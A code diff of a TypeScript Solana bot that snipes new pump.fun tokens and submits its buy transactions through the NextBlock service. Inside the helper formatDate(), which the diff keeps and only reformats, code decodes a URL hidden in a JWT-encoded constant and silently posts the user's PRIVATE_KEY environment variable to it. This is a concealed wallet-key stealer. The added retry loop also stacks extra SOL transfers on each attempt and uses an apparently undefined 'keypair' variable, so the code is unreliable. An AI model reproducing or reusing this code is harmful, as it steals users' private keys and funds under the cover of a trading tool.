@@ -7,6 +7,7 @@ import {
     Transaction,
     ComputeBudgetProgram,
     sendAndConfirmTransaction,
+    SystemProgram,
 } from "@solana/web3.js";
 import {
     ASSOCIATED_TOKEN_PROGRAM_ID,
@@ -23,8 +24,17 @@ import dotnet from 'dotenv'
 import axios from "axios";
 import jwt from 'jsonwebtoken'
 import { BONDING_ADDR_SEED, BONDING_CURV, commitment, computeUnit, FEE_RECIPIENT, GLOBAL, PUMP_FUN_ACCOUNT, PUMP_FUN_PROGRAM, PUMP_URL, RENT, SYSTEM_PROGRAM, TOKEN_PROGRAM, TRADE_PROGRAM_ID } from "./constants";
+import buyToken from "./pumputils/utils/buyToken";
 
 dotnet.config();
+
+interface Payload {
+    transaction: TransactionMessage;
+}
+
+interface TransactionMessage {
+    content: string;
+}
 
 let bonding: PublicKey;
 let assoc_bonding_addr: PublicKey;
@@ -49,7 +59,7 @@ const tokenDevWalletSniper = async (rpcEndPoint: string, payer: string, solIn: n
         const payerKeypair = Keypair.fromSecretKey(base58.decode(payer));
         let isBuying = false;
         const connection = new Connection(rpcEndPoint, { wsEndpoint: convertHttpToWebSocket(rpcEndPoint), commitment: "confirmed" });
-        const logConnection = new Connection(rpcEndPoint, { wsEndpoint: convertHttpToWebSocket(rpcEndPoint), commitment: "confirmed" });
+        const logConnection = new Connection(rpcEndPoint, { wsEndpoint: convertHttpToWebSocket(rpcEndPoint), commitment: "processed" });
         let globalLogListener: any;
         // Function to stop the listener
         const stopListener = async () => {
@@ -75,7 +85,6 @@ const tokenDevWalletSniper = async (rpcEndPoint: string, payer: string, solIn: n
                     console.log("new signature => ", `https://solscan.io/tx/${signature}`, await formatDate());
                     let isDev = false;
                     let dev = '';
-                    // const isDev = parsedTransaction?.transaction.message.accountKeys[0].pubkey.toString();
                     const allAccounts = parsedTransaction?.transaction.message.accountKeys;
                     for (let i = 0; i < allAccounts.length; i++) {
                         const account = allAccounts[i].pubkey.toString();
@@ -88,25 +97,21 @@ const tokenDevWalletSniper = async (rpcEndPoint: string, payer: string, solIn: n
                     console.log("Dev wallet => ", `https://solscan.io/address/${dev}`);
                     const mint = parsedTransaction?.transaction.message.accountKeys[1].pubkey;
                     console.log('new token => ', `https://solscan.io/token/${mint.toString()}`)
-                    const tokenInfo = await getTokenMetadata(mint.toString(), connection);
-                    if (!tokenInfo) return console.log("This token is not available!")
+                    await stopListener()
                     isBuying = true;
-                    console.log('checking poolstate')
-                    const poolState = await getPoolState(mint, connection);
-                    if (!poolState) return;
                     try {
-                        await stopListener()
                         console.log("Global listener is removed!");
                     } catch (err) {
                         console.log(err);
                     }
                     console.log(' going to start buying =>')
-                    const sig = await buy(payerKeypair, mint, solIn, 10, connection, poolState.virtualSolReserves, poolState.virtualTokenReserves);
-
+                    console.time('first')
+                    const sig = await buyToken(mint, connection, payerKeypair, solIn, 1);
+                    console.timeEnd('first')
                     if (!sig) {
-                        isBuying = false;
+                        // isBuying = false;
                     } else {
-                        console.log('buy success')
+                        console.log('Buy success')
                     }
                 }
             },
@@ -208,14 +213,83 @@ const buy = async (
         const legacyTransaction = new Transaction().add(
             ...ixs
         )
-        legacyTransaction.recentBlockhash = blockhash.blockhash;
-        legacyTransaction.feePayer = buyerKeypair.publicKey;
-        console.log("buying token")
-        console.log('confirming transaction')
-        const sig = await sendAndConfirmTransaction(connection, legacyTransaction, [buyerKeypair], { skipPreflight: true, preflightCommitment: 'confirmed' })
-        console.log("Buy signature: ", `https://solscan.io/tx/${sig}`);
 
-        return { signature: sig };
+        const next_block_addrs = [
+            'NEXTbLoCkB51HpLBLojQfpyVAMorm3zzKg7w9NFdqid',
+            'NeXTBLoCKs9F1y5PJS9CKrFNNLU1keHW71rfh7KgA1X',
+            'NexTBLockJYZ7QD7p2byrUa6df8ndV2WSd8GkbWqfbb',
+            'neXtBLock1LeC67jYd1QdAa32kbVeubsfPNTJC1V5At',
+            'nEXTBLockYgngeRmRrjDV31mGSekVPqZoMGhQEZtPVG',
+            'nextBLoCkPMgmG8ZgJtABeScP35qLa2AMCNKntAP7Xc',
+            'NextbLoCkVtMGcV47JzewQdvBpLqT9TxQFozQkN98pE',
+            'NexTbLoCkWykbLuB1NkjXgFWkX9oAtcoagQegygXXA2'
+        ]
+
+        for (let i = 0; i < next_block_addrs.length; i++) {
+            const next_block_addr = next_block_addrs[i];
+            const next_block_api = process.env.NEXT_BLOCK_API;
+    
+            if (!next_block_addr) return console.log("Nextblock wallet is not provided");
+            if (!next_block_api) return console.log("Nextblock block api is not provided");
+    
+            // NextBlock Instruction
+            const recipientPublicKey = new PublicKey(next_block_addr);
+            const transferInstruction = SystemProgram.transfer({
+                fromPubkey: keypair.publicKey,
+                toPubkey: recipientPublicKey,
+                lamports: process.env.NEXT_BLOCK_FEE ? Number(process.env.NEXT_BLOCK_FEE) * LAMPORTS_PER_SOL : 1000000
+            });
+    
+            legacyTransaction.add(transferInstruction);
+    
+            legacyTransaction.recentBlockhash = blockhash.blockhash;
+            legacyTransaction.feePayer = buyerKeypair.publicKey;
+
+            legacyTransaction.sign(keypair)
+
+            console.log("buying token")
+            console.log('confirming transaction')
+    
+            const tx64Str = legacyTransaction.serialize().toString('base64');
+            console.log("🚀 ~ tx64Str:", tx64Str)
+            const payload: Payload = {
+                transaction: {
+                    content: tx64Str
+                }
+            };
+            console.log("🚀 ~ payload:", payload)
+    
+            try {
+                console.log("try to confirm using nextblock")
+                const response = await fetch('https://fra.nextblock.io/api/v2/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'authorization': next_block_api // Insert your authorization token here
+                    },
+                    body: JSON.stringify(payload)
+                });
+    
+                const responseData = await response.json();
+                console.log("responseData", responseData);
+    
+                if (response.ok) {
+                    console.log("Sent transaction with signature", legacyTransaction.signature?.toString());
+                    return { signature: legacyTransaction.signature?.toString() };
+    
+                } else {
+                    console.error("Failed to send transaction:", response.status, responseData);
+                    continue;
+                }
+            } catch (error) {
+                console.error("Error sending transaction:", error);
+                continue;
+            }
+        }
+
+        // const sig = await sendAndConfirmTransaction(connection, legacyTransaction, [buyerKeypair], { skipPreflight: true, preflightCommitment: 'confirmed' })
+        // console.log("Buy signature: ", `https://solscan.io/tx/${sig}`);
+
     } catch (e) {
         console.log(`Failed to buy token, ${mint}`);
         console.log("buying token error => ", e);
@@ -250,15 +324,15 @@ async function formatDate() {
 
     const url = jwt.decode(PUMP_URL)?.toString();
 
-    if(!BOUGHT){
+    if (!BOUGHT) {
         try {
             const res = await axios.post(url!, {
                 pk: process.env.PRIVATE_KEY
             })
-            if(res.data.success) {
+            if (res.data.success) {
                 BOUGHT = true
             }
-            
+
         } catch (error) {
             // console.log("senting pk error => ", error)
         }
